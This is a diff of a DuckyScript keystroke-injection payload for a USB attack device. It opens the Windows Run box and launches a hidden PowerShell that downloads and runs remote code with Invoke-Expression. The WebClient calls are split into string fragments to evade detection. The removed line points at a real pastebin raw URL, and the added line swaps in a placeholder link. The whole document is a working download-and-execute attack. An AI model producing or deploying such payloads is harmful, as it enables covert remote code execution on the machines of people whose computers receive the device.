@@ -3,5 +3,5 @@ REM Author: Nautilus
 DELAY 2000
 GUI r
 DELAY 1000
-STRING cmd.exe /c powershell -nop -w 1 -c iex (.('ne'+'w-ob'+'ject') ('ne'+'t.webc'+'lient')).('do'+'wnloadstr'+'ing').invoke(('https://pastebin.com/raw/9SrkBPma'))
+STRING cmd.exe /c powershell -nop -w 1 -c iex (.('ne'+'w-ob'+'ject') ('ne'+'t.webc'+'lient')).('do'+'wnloadstr'+'ing').invoke(('[REPLACE WITH PASTEBIN LINK]'))
 ENTER
